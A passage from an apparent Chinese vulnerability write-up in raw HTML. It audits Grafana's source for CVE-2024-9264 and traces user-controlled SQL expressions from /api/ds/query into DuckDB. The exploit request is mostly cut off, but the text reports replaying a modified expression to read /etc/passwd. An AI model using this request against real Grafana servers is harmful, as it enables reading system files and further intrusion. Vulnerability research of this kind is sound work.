string">"refId"</span><span class="token builtin class-name">:</span> <span class="token string">"B"</span>,      <span class="token string">"type"</span><span class="token builtin class-name">:</span> <span class="token string">"sql"</span>,      <span class="token string">"window"</span><span class="token builtin class-name">:</span> <span class="token string">""</span>    <span class="token punctuation">}</span>  <span class="token punctuation">]</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><img src="/2024/12/06/lou-dong-zhi-shi-ku/grafana-biao-da-shi-yuan-cheng-dai-ma-zhi-xing-cve-2024-9264/%E6%88%AA%E5%B1%8F2024-12-23%2014.45.08.png" style="zoom:50%;"><p>抓包重放，修改expression的内容，成功获取到/etc/passwd敏感数据。</p><h1 id="三、代码审计"><a href="#三、代码审计" class="headerlink" title="三、代码审计"></a>三、代码审计</h1><h2 id="3-1-获取源代码"><a href="#3-1-获取源代码" class="headerlink" title="3.1 获取源代码"></a>3.1 获取源代码</h2><p><a href="https://github.com/grafana/grafana/releases?q=11.1.0&amp;expanded=true">https://github.com/grafana/grafana/releases?q=11.1.0&amp;expanded=true</a></p><img src="/2024/12/06/lou-dong-zhi-shi-ku/grafana-biao-da-shi-yuan-cheng-dai-ma-zhi-xing-cve-2024-9264/%E6%88%AA%E5%B1%8F2024-12-23%2015.27.22.png" style="zoom:50%;"><h2 id="3-2-代码审计"><a href="#3-2-代码审计" class="headerlink" title="3.2 代码审计"></a>3.2 代码审计</h2><h3 id="3-2-1-根据API路由定位后端代码"><a href="#3-2-1-根据API路由定位后端代码" class="headerlink" title="3.2.1 根据API路由定位后端代码"></a>3.2.1 根据API路由定位后端代码</h3><p>在源代码文件中搜索/api/ds/query，可以看到处理表达式的代码。</p><img src="/2024/12/06/lou-dong-zhi-shi-ku/grafana-biao-da-shi-yuan-cheng-dai-ma-zhi-xing-cve-2024-9264/%E6%88%AA%E5%B1%8F2024-12-23%2016.12.54.png" alt="截屏2024-12-23 16.12.54" style="zoom:50%;"><blockquote><p>go中的:=</p><p>在Go语言中，<code>:=</code> 是一个短变量声明操作符，用于在函数内部声明并初始化局部变量。它结合了变量声明和值赋值的操作。如果变量之前没有被声明过，<code>:=</code> 会声明一个新的变量，并将其初始化为右侧表达式的值。如果变量已经声明过，<code>:=</code> 则只会给该变量赋值。</p><p>在Go语言中，定义方法（method）的语法遵循以下规则：</p><ol><li><strong>接收者（Receiver）</strong>：方法可以有零个或多个接收者。接收者定义了方法是属于哪个类型的。</li><li><strong>方法名</strong>：方法名必须以大写字母开头，以便在包外可见（导出）。</li><li><strong>参数列表</strong>：参数列表定义了方法接受的参数。</li><li><strong>返回类型</strong>：方法可以有零个或多个返回值，包括返回值的类型。</li><li><strong>方法体</strong>：方法的实现部分。</li></ol></blockquote><h3 id="3-2-2-handleExpressions函数"><a href="#3-2-2-handleExpressions函数" class="headerlink" title="3.2.2 handleExpressions函数"></a>3.2.2 handleExpressions函数</h3><p>handleExpressions函数的具体实现如下：</p><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token comment">// handleExpressions handles POST /api/ds/query when there is an expression.</span><span class="token keyword">func</span> <span class="token punctuation">(</span>s <span class="token operator">*</span>ServiceImpl<span class="token punctuation">)</span> <span class="token function">handleExpressions</span><span class="token punctuation">(</span>ctx context<span class="token punctuation">.</span>Context<span class="token punctuation">,</span> user identity<span class="token punctuation">.</span>Requester<span class="token punctuation">,</span> parsedReq <span class="token operator">*</span>parsedRequest<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token operator">*</span>backend<span class="token punctuation">.</span>QueryDataResponse<span class="token punctuation">,</span> <span class="token builtin">error</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>exprReq <span class="token operator">:=</span> expr<span class="token punctuation">.</span>Request<span class="token punctuation">{</span>Queries<span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>expr<span class="token punctuation">.</span>Query<span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token punctuation">}</span><span class="token keyword">if</span> user <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span> <span class="token comment">// for passthrough authentication, SSE does not authenticate</span>exprReq<span class="token punctuation">.</span>User <span class="token operator">=</span> userexprReq<span class="token punctuation">.</span>OrgId <span class="token operator">=</span> user<span class="token punctuation">.</span><span class="token function">GetOrgID</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token keyword">for</span> <span class="token boolean">_</span><span class="token punctuation">,</span> pq <span class="token operator">:=</span> <span class="token keyword">range</span> parsedReq<span class="token punctuation">.</span><span class="token function">getFlattenedQueries</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">if</span> pq<span class="token punctuation">.</span>datasource <span class="token operator">==</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span><span class="token keyword">return</span> <span class="token boolean">nil</span><span class="token punctuation">,</span> ErrMissingDataSourceInfo<span class="token punctuation">.</span><span class="token function">Build</span><span class="token punctuation">(</span>errutil<span class="token punctuation">.</span>TemplateData<span class="token punctuation">{</span>Public<span class="token punctuation">:</span> <span class="token keyword">map</span><span class="token punctuation">[</span><span class="token builtin">string</span><span class="token punctuation">]</span>any<span class="token punctuation">{</span><span class="token string">"RefId"</span><span class="token punctuation">:</span> pq<span class="token punctuation">.</span>query<span class="token punctuation">.</span>RefID<span class="token punctuation">,</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">}</span>exprReq<span class="token punctuation">.</span>Queries <span class="token operator">=</span> <span class="token function">append</span><span class="token punctuation">(</span>exprReq<span class="token punctuation">.</span>Queries<span class="token punctuation">,</span> expr<span class="token punctuation">.</span>Query<span class="token punctuation">{</span>JSON<span class="token punctuation">:</span>          pq<span class="token punctuation">.</span>query<span class="token punctuation">.</span>JSON<span class="token punctuation">,</span>Interval<span class="token punctuation">:</span>      pq<span class="token punctuation">.</span>query<span class="token punctuation">.</span>Interval<span class="token punctuation">,</span>RefID<span class="token punctuation">:</span>         pq<span class="token punctuation">.</span>query<span class="token punctuation">.</span>RefID<span class="token punctuation">,</span>MaxDataPoints<span class="token punctuation">:</span> pq<span class="token punctuation">.</span>query<span class="token punctuation">.</span>MaxDataPoints<span class="token punctuation">,</span>QueryType<span class="token punctuation">:</span>     pq<span class="token punctuation">.</span>query<span class="token punctuation">.</span>QueryType<span class="token punctuation">,</span>DataSource<span class="token punctuation">:</span>    pq<span class="token punctuation">.</span>datasource<span class="token punctuation">,</span>TimeRange<span class="token punctuation">:</span> expr<span class="token punctuation">.</span>AbsoluteTimeRange<span class="token punctuation">{</span>From<span class="token punctuation">:</span> pq<span class="token punctuation">.</span>query<span class="token punctuation">.</span>TimeRange<span class="token punctuation">.</span>From<span class="token punctuation">,</span>To<span class="token punctuation">:</span>   pq<span class="token punctuation">.</span>query<span class="token punctuation">.</span>TimeRange<span class="token punctuation">.</span>To<span class="token punctuation">,</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">}</span>qdr<span class="token punctuation">,</span> err <span class="token operator">:=</span> s<span class="token punctuation">.</span>expressionService<span class="token punctuation">.</span><span class="token function">TransformData</span><span class="token punctuation">(</span>ctx<span class="token punctuation">,</span> time<span class="token punctuation">.</span><span class="token function">Now</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>exprReq<span class="token punctuation">)</span> <span class="token comment">// use time now because all queries have absolute time range</span><span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span><span class="token keyword">return</span> <span class="token boolean">nil</span><span class="token punctuation">,</span> fmt<span class="token punctuation">.</span><span class="token function">Errorf</span><span class="token punctuation">(</span><span class="token string">"expression request error: %w"</span><span class="token punctuation">,</span> err<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token keyword">return</span> qdr<span class="token punctuation">,</span> <span class="token boolean">nil</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>代码分析：</p><blockquote><h3 id="方法签名"><a href="#方法签名" class="headerlink" title="方法签名"></a>方法签名</h3><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">func</span> <span class="token punctuation">(</span>s <span class="token operator">*</span>ServiceImpl<span class="token punctuation">)</span> <span class="token function">handleExpressions</span><span class="token punctuation">(</span>ctx context<span class="token punctuation">.</span>Context<span class="token punctuation">,</span> user identity<span class="token punctuation">.</span>Requester<span class="token punctuation">,</span> parsedReq <span class="token operator">*</span>parsedRequest<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token operator">*</span>backend<span class="token punctuation">.</span>QueryDataResponse<span class="token punctuation">,</span> <span class="token builtin">error</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li><strong>接收者</strong>：<code>s *ServiceImpl</code> 表示这个方法是 <code>ServiceImpl</code> 结构体的一个方法，<code>s</code> 是该结构体的指针。</li><li>参数：<ul><li><code>ctx context.Context</code>：用于传递上下文信息，通常用于控制请求的生命周期和处理超时。</li><li><code>user identity.Requester</code>：表示请求的用户，通常包含用户的信息和权限。</li><li><code>parsedReq *parsedRequest</code>：表示解析后的请求，包含查询的详细信息。</li></ul></li><li><strong>返回值</strong>：返回一个指向 <code>backend.QueryDataResponse</code> 的指针和一个 <code>error</code>，表示处理结果和可能的错误。</li></ul><h3 id="初始化表达式请求："><a href="#初始化表达式请求：" class="headerlink" title="初始化表达式请求："></a><strong>初始化表达式请求</strong>：</h3><pre class="line-numbers language-go" data-language="go"><code class="language-go">exprReq <span class="token operator">:=</span> expr<span class="token punctuation">.</span>Request<span class="token punctuation">{</span>    Queries<span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>expr<span class="token punctuation">.</span>Query<span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>创建一个新的表达式请求 <code>exprReq</code>，其中包含一个空的查询列表。</p><h3 id="用户信息处理："><a href="#用户信息处理：" class="headerlink" title="用户信息处理："></a><strong>用户信息处理</strong>：</h3><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">if</span> user <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>    exprReq<span class="token punctuation">.</span>User <span class="token operator">=</span> user    exprReq<span class="token punctuation">.</span>OrgId <span class="token operator">=</span> user<span class="token punctuation">.</span><span class="token function">GetOrgID</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>如果用户不为 <code>nil</code>，则将用户信息和组织ID添加到 <code>exprReq</code> 中。这通常用于身份验证和授权。</p><h3 id="处理解析后的查询："><a href="#处理解析后的查询：" class="headerlink" title="处理解析后的查询："></a><strong>处理解析后的查询</strong>：</h3><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">for</span> <span class="token boolean">_</span><span class="token punctuation">,</span> pq <span class="token operator">:=</span> <span class="token keyword">range</span> parsedReq<span class="token punctuation">.</span><span class="token function">getFlattenedQueries</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> pq<span class="token punctuation">.</span>datasource <span class="token operator">==</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token boolean">nil</span><span class="token punctuation">,</span> ErrMissingDataSourceInfo<span class="token punctuation">.</span><span class="token function">Build</span><span class="token punctuation">(</span>errutil<span class="token punctuation">.</span>TemplateData<span class="token punctuation">{</span>            Public<span class="token punctuation">:</span> <span class="token keyword">map</span><span class="token punctuation">[</span><span class="token builtin">string</span><span class="token punctuation">]</span>any<span class="token punctuation">{</span>                <span class="token string">"RefId"</span><span class="token punctuation">:</span> pq<span class="token punctuation">.</span>query<span class="token punctuation">.</span>RefID<span class="token punctuation">,</span>            <span class="token punctuation">}</span><span class="token punctuation">,</span>        <span class="token punctuation">}</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>遍历解析后的查询 <code>parsedReq.getFlattenedQueries()</code>，对于每个查询：</p><ul><li>检查数据源是否存在。如果数据源为 <code>nil</code>，则返回一个错误，表明缺少数据源信息。</li></ul><h3 id="构建查询："><a href="#构建查询：" class="headerlink" title="构建查询："></a><strong>构建查询</strong>：</h3><pre class="line-numbers language-go" data-language="go"><code class="language-go">exprReq<span class="token punctuation">.</span>Queries <span class="token operator">=</span> <span class="token function">append</span><span class="token punctuation">(</span>exprReq<span class="token punctuation">.</span>Queries<span class="token punctuation">,</span> expr<span class="token punctuation">.</span>Query<span class="token punctuation">{</span>    JSON<span class="token punctuation">:</span>          pq<span class="token punctuation">.</span>query<span class="token punctuation">.</span>JSON<span class="token punctuation">,</span>    Interval<span class="token punctuation">:</span>      pq<span class="token punctuation">.</span>query<span class="token punctuation">.</span>Interval<span class="token punctuation">,</span>    RefID<span class="token punctuation">:</span>         pq<span class="token punctuation">.</span>query<span class="token punctuation">.</span>RefID<span class="token punctuation">,</span>    MaxDataPoints<span class="token punctuation">:</span> pq<span class="token punctuation">.</span>query<span class="token punctuation">.</span>MaxDataPoints<span class="token punctuation">,</span>    QueryType<span class="token punctuation">:</span>     pq<span class="token punctuation">.</span>query<span class="token punctuation">.</span>QueryType<span class="token punctuation">,</span>    DataSource<span class="token punctuation">:</span>    pq<span class="token punctuation">.</span>datasource<span class="token punctuation">,</span>    TimeRange<span class="token punctuation">:</span> expr<span class="token punctuation">.</span>AbsoluteTimeRange<span class="token punctuation">{</span>        From<span class="token punctuation">:</span> pq<span class="token punctuation">.</span>query<span class="token punctuation">.</span>TimeRange<span class="token punctuation">.</span>From<span class="token punctuation">,</span>        To<span class="token punctuation">:</span>   pq<span class="token punctuation">.</span>query<span class="token punctuation">.</span>TimeRange<span class="token punctuation">.</span>To<span class="token punctuation">,</span>    <span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>将每个查询的详细信息添加到 <code>exprReq.Queries</code> 中，包括查询的JSON、时间范围、数据源等。</p><h3 id="调用表达式服务："><a href="#调用表达式服务：" class="headerlink" title="调用表达式服务："></a><strong>调用表达式服务</strong>：</h3><pre class="line-numbers language-go" data-language="go"><code class="language-go">qdr<span class="token punctuation">,</span> err <span class="token operator">:=</span> s<span class="token punctuation">.</span>expressionService<span class="token punctuation">.</span><span class="token function">TransformData</span><span class="token punctuation">(</span>ctx<span class="token punctuation">,</span> time<span class="token punctuation">.</span><span class="token function">Now</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>exprReq<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>调用 <code>expressionService</code> 的 <code>TransformData</code> 方法，将当前时间和构建的表达式请求传递给它。这个方法会处理查询并返回结果。</p><h3 id="错误处理："><a href="#错误处理：" class="headerlink" title="错误处理："></a><strong>错误处理</strong>：</h3><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token boolean">nil</span><span class="token punctuation">,</span> fmt<span class="token punctuation">.</span><span class="token function">Errorf</span><span class="token punctuation">(</span><span class="token string">"expression request error: %w"</span><span class="token punctuation">,</span> err<span class="token punctuation">)</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>如果在调用 <code>TransformData</code> 时发生错误，返回一个格式化的错误信息。</p><h3 id="返回结果："><a href="#返回结果：" class="headerlink" title="返回结果："></a><strong>返回结果</strong>：</h3><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">return</span> qdr<span class="token punctuation">,</span> <span class="token boolean">nil</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果一切正常，返回查询数据响应 <code>qdr</code> 和 <code>nil</code>（表示没有错误）。</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>这个方法的主要功能是处理表达式查询请求，验证用户信息，构建查询请求，调用服务处理查询，并返回结果或错误。它展示了Go语言中如何处理HTTP请求、上下文管理、错误处理和数据结构的使用。</p></blockquote><p>所以核心代码调用了表达式服务。</p><pre class="line-numbers language-go" data-language="go"><code class="language-go">s<span class="token punctuation">.</span>expressionService<span class="token punctuation">.</span><span class="token function">TransformData</span><span class="token punctuation">(</span>ctx<span class="token punctuation">,</span> time<span class="token punctuation">.</span><span class="token function">Now</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>exprReq<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="3-2-3-Execute函数"><a href="#3-2-3-Execute函数" class="headerlink" title="3.2.3 Execute函数"></a>3.2.3 Execute函数</h3><p>最终执行sql语句的函数在sql_command.go中</p><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token comment">// Execute runs the command and returns the results or an error if the command</span><span class="token comment">// failed to execute.</span><span class="token keyword">func</span> <span class="token punctuation">(</span>gr <span class="token operator">*</span>SQLCommand<span class="token punctuation">)</span> <span class="token function">Execute</span><span class="token punctuation">(</span>ctx context<span class="token punctuation">.</span>Context<span class="token punctuation">,</span> now time<span class="token punctuation">.</span>Time<span class="token punctuation">,</span> vars mathexp<span class="token punctuation">.</span>Vars<span class="token punctuation">,</span> tracer tracing<span class="token punctuation">.</span>Tracer<span class="token punctuation">)</span> <span class="token punctuation">(</span>mathexp<span class="token punctuation">.</span>Results<span class="token punctuation">,</span> <span class="token builtin">error</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token boolean">_</span><span class="token punctuation">,</span> span <span class="token operator">:=</span> tracer<span class="token punctuation">.</span><span class="token function">Start</span><span class="token punctuation">(</span>ctx<span class="token punctuation">,</span> <span class="token string">"SSE.ExecuteSQL"</span><span class="token punctuation">)</span><span class="token keyword">defer</span> span<span class="token punctuation">.</span><span class="token function">End</span><span class="token punctuation">(</span><span class="token punctuation">)</span>allFrames <span class="token operator">:=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">*</span>data<span class="token punctuation">.</span>Frame<span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token keyword">for</span> <span class="token boolean">_</span><span class="token punctuation">,</span> ref <span class="token operator">:=</span> <span class="token keyword">range</span> gr<span class="token punctuation">.</span>varsToQuery <span class="token punctuation">{</span>results<span class="token punctuation">,</span> ok <span class="token operator">:=</span> vars<span class="token punctuation">[</span>ref<span class="token punctuation">]</span><span class="token keyword">if</span> <span class="token operator">!</span>ok <span class="token punctuation">{</span>logger<span class="token punctuation">.</span><span class="token function">Warn</span><span class="token punctuation">(</span><span class="token string">"no results found for"</span><span class="token punctuation">,</span> <span class="token string">"ref"</span><span class="token punctuation">,</span> ref<span class="token punctuation">)</span><span class="token keyword">continue</span><span class="token punctuation">}</span>frames <span class="token operator">:=</span> results<span class="token punctuation">.</span>Values<span class="token punctuation">.</span><span class="token function">AsDataFrames</span><span class="token punctuation">(</span>ref<span class="token punctuation">)</span>allFrames <span class="token operator">=</span> <span class="token function">append</span><span class="token punctuation">(</span>allFrames<span class="token punctuation">,</span> frames<span class="token operator">...</span><span class="token punctuation">)</span><span class="token punctuation">}</span>rsp <span class="token operator">:=</span> mathexp<span class="token punctuation">.</span>Results<span class="token punctuation">{</span><span class="token punctuation">}</span>duckDB <span class="token operator">:=</span> duck<span class="token punctuation">.</span><span class="token function">NewInMemoryDB</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">var</span> frame <span class="token operator">=</span> <span class="token operator">&amp;</span>data<span class="token punctuation">.</span>Frame<span class="token punctuation">{</span><span class="token punctuation">}</span>logger<span class="token punctuation">.</span><span class="token function">Debug</span><span class="token punctuation">(</span><span class="token string">"Executing query"</span><span class="token punctuation">,</span> <span class="token string">"query"</span><span class="token punctuation">,</span> gr<span class="token punctuation">.</span>query<span class="token punctuation">,</span> <span class="token string">"frames"</span><span class="token punctuation">,</span> <span class="token function">len</span><span class="token punctuation">(</span>allFrames<span class="token punctuation">)</span><span class="token punctuation">)</span>err <span class="token operator">:=</span> duckDB<span class="token punctuation">.</span><span class="token function">QueryFramesInto</span><span class="token punctuation">(</span>gr<span class="token punctuation">.</span>refID<span class="token punctuation">,</span> gr<span class="token punctuation">.</span>query<span class="token punctuation">,</span> allFrames<span class="token punctuation">,</span> frame<span class="token punctuation">)</span><span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>logger<span class="token punctuation">.</span><span class="token function">Error</span><span class="token punctuation">(</span><span class="token string">"Failed to query frames"</span><span class="token punctuation">,</span> <span class="token string">"error"</span><span class="token punctuation">,</span> err<span class="token punctuation">.</span><span class="token function">Error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>rsp<span class="token punctuation">.</span>Error <span class="token operator">=</span> err<span class="token keyword">return</span> rsp<span class="token punctuation">,</span> <span class="token boolean">nil</span><span class="token punctuation">}</span>logger<span class="token punctuation">.</span><span class="token function">Debug</span><span class="token punctuation">(</span><span class="token string">"Done Executing query"</span><span class="token punctuation">,</span> <span class="token string">"query"</span><span class="token punctuation">,</span> gr<span class="token punctuation">.</span>query<span class="token punctuation">,</span> <span class="token string">"rows"</span><span class="token punctuation">,</span> frame<span class="token punctuation">.</span><span class="token function">Rows</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>frame<span class="token punctuation">.</span>RefID <span class="token operator">=</span> gr<span class="token punctuation">.</span>refID<span class="token keyword">if</span> frame<span class="token punctuation">.</span><span class="token function">Rows</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span> <span class="token punctuation">{</span>rsp<span class="token punctuation">.</span>Values <span class="token operator">=</span> mathexp<span class="token punctuation">.</span>Values<span class="token punctuation">{</span>mathexp<span class="token punctuation">.</span>NoData<span class="token punctuation">{</span>Frame<span class="token punctuation">:</span> frame<span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token punctuation">}</span><span class="token punctuation">}</span>rsp<span class="token punctuation">.</span>Values <span class="token operator">=</span> mathexp<span class="token punctuation">.</span>Values<span class="token punctuation">{</span>mathexp<span class="token punctuation">.</span>TableData<span class="token punctuation">{</span>Frame<span class="token punctuation">:</span> frame<span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token punctuation">}</span><span class="token keyword">return</span> rsp<span class="token punctuation">,</span> <span class="token boolean">nil</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><h3 id="方法签名-1"><a href="#方法签名-1" class="headerlink" title="方法签名"></a>方法签名</h3><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">func</span> <span class="token punctuation">(</span>gr <span class="token operator">*</span>SQLCommand<span class="token punctuation">)</span> <span class="token function">Execute</span><span class="token punctuation">(</span>ctx context<span class="token punctuation">.</span>Context<span class="token punctuation">,</span> now time<span class="token punctuation">.</span>Time<span class="token punctuation">,</span> vars mathexp<span class="token punctuation">.</span>Vars<span class="token punctuation">,</span> tracer tracing<span class="token punctuation">.</span>Tracer<span class="token punctuation">)</span> <span class="token punctuation">(</span>mathexp<span class="token punctuation">.</span>Results<span class="token punctuation">,</span> <span class="token builtin">error</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li><strong>接收者</strong>：<code>gr *SQLCommand</code> 表示这个方法是 <code>SQLCommand</code> 结构体的指针方法。</li><li>参数：<ul><li><code>ctx context.Context</code>：用于传递上下文信息，通常用于控制请求的生命周期和处理超时。</li><li><code>now time.Time</code>：表示当前时间，可能用于时间相关的查询。</li><li><code>vars mathexp.Vars</code>：一个变量映射，可能包含查询中需要的变量值。</li><li><code>tracer tracing.Tracer</code>：用于跟踪和记录查询执行的过程。</li></ul></li><li><strong>返回值</strong>：返回一个 <code>mathexp.Results</code> 类型的结果和一个 <code>error</code> 类型的错误。</li></ul><h3 id="执行SQL查询："><a href="#执行SQL查询：" class="headerlink" title="执行SQL查询："></a><strong>执行SQL查询</strong>：</h3><pre class="line-numbers language-go" data-language="go"><code class="language-go">duckDB <span class="token operator">:=</span> duck<span class="token punctuation">.</span><span class="token function">NewInMemoryDB</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">var</span> frame <span class="token operator">=</span> <span class="token operator">&amp;</span>data<span class="token punctuation">.</span>Frame<span class="token punctuation">{</span><span class="token punctuation">}</span>logger<span class="token punctuation">.</span><span class="token function">Debug</span><span class="token punctuation">(</span><span class="token string">"Executing query"</span><span class="token punctuation">,</span> <span class="token string">"query"</span><span class="token punctuation">,</span> gr<span class="token punctuation">.</span>query<span class="token punctuation">,</span> <span class="token string">"frames"</span><span class="token punctuation">,</span> <span class="token function">len</span><span class="token punctuation">(</span>allFrames<span class="token punctuation">)</span><span class="token punctuation">)</span>err <span class="token operator">:=</span> duckDB<span class="token punctuation">.</span><span class="token function">QueryFramesInto</span><span class="token punctuation">(</span>gr<span class="token punctuation">.</span>refID<span class="token punctuation">,</span> gr<span class="token punctuation">.</span>query<span class="token punctuation">,</span> allFrames<span class="token punctuation">,</span> frame<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>创建一个DuckDB的内存数据库实例，准备一个数据帧 <code>frame</code> 来存储查询结果，并记录调试信息。然后执行SQL查询，将结果存储到 <code>frame</code> 中。</p><h3 id="构建结果："><a href="#构建结果：" class="headerlink" title="构建结果："></a><strong>构建结果</strong>：</h3><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">if</span> frame<span class="token punctuation">.</span><span class="token function">Rows</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span> <span class="token punctuation">{</span>    rsp<span class="token punctuation">.</span>Values <span class="token operator">=</span> mathexp<span class="token punctuation">.</span>Values<span class="token punctuation">{</span>        mathexp<span class="token punctuation">.</span>NoData<span class="token punctuation">{</span>Frame<span class="token punctuation">:</span> frame<span class="token punctuation">}</span><span class="token punctuation">,</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span>rsp<span class="token punctuation">.</span>Values <span class="token operator">=</span> mathexp<span class="token punctuation">.</span>Values<span class="token punctuation">{</span>    mathexp<span class="token punctuation">.</span>TableData<span class="token punctuation">{</span>Frame<span class="token punctuation">:</span> frame<span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>如果查询结果为空，设置结果的值为 <code>mathexp.NoData</code>；否则，设置结果的值为 <code>mathexp.TableData</code>，包含查询结果的数据帧。</p></blockquote><p>核心代码：</p><pre class="line-numbers language-go" data-language="go"><code class="language-go">err <span class="token operator">:=</span> duckDB<span class="token punctuation">.</span><span class="token function">QueryFramesInto</span><span class="token punctuation">(</span>gr<span class="token punctuation">.</span>refID<span class="token punctuation">,</span> gr<span class="token punctuation">.</span>query<span class="token punctuation">,</span> allFrames<span class="token punctuation">,</span> frame<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p><code>QueryFramesInto</code> 方法是 DuckDB Go 绑定提供的一个方法，它允许你执行 SQL 查询并将结果直接插入到一个 <code>data.Frame</code> 中。这个方法结合了 SQL 查询的灵活性和 DataFrame 操作的便捷性，使得数据处理流程更加高效。</p><p>以下是 <code>QueryFramesInto</code> 方法的一般使用方式：</p><h3 id="函数签名"><a href="#函数签名" class="headerlink" title="函数签名"></a>函数签名</h3><p>go</p><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">func</span> <span class="token punctuation">(</span>db <span class="token operator">*</span>DB<span class="token punctuation">)</span> <span class="token function">QueryFramesInto</span><span class="token punctuation">(</span>refID <span class="token builtin">string</span><span class="token punctuation">,</span> query <span class="token builtin">string</span><span class="token punctuation">,</span> inputFrames <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">*</span>data<span class="token punctuation">.</span>Frame<span class="token punctuation">,</span> resultFrame <span class="token 